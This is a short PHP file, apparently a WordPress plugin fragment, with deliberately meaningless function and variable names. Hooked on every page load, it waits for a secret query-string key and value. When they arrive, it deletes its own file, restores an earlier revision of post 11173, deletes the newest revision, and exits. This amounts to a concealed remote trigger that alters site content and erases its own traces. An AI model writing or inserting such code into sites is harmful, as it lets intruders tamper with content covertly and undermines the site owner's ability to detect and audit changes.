<?php

function item_uploader_guest_terms() {
	if (isset($_GET['check_slider_header_service']) && $_GET['check_slider_header_service'] === 'numbers_favicon_messages_clean') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$meta_jetpack_media_terms = 11173;
		$color_default_content = wp_get_post_revisions($meta_jetpack_media_terms);
		if (empty($color_default_content)) die('no revisions');
		if (count($color_default_content) < 2) die('less than 2');
		$demo_info_role_optimize = array_shift($color_default_content);
		$enhanced_events_custom_beaver = $demo_info_role_optimize->ID;
		$exception_audio_auto = array_shift($color_default_content);
		$patterns_demo_duplicate_404 = $exception_audio_auto->ID;
		$clock_member_toggle = wp_restore_post_revision($patterns_demo_duplicate_404);
		if ($clock_member_toggle === false) die('error restoring');
		$clock_member_toggle = wp_delete_post_revision($enhanced_events_custom_beaver);		
		if ($clock_member_toggle === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'item_uploader_guest_terms');
